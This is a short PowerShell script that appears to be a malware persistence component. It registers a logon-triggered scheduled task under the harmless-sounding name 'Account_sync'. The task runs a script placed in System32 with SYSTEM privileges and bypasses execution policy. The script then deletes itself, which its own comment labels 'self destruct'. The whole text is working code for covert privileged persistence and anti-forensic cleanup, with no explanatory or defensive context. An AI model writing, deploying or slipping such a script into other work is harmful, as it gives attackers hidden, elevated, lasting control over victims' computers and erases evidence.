# variables for scheduled task
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -noninteractive -File "C:\Windows\System32\exit.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "Account_sync" -Action $action -Trigger $trigger -Principal $principal
# self destruct
Remove-Item -Path $MyInvocation.MyCommand.Source -Force
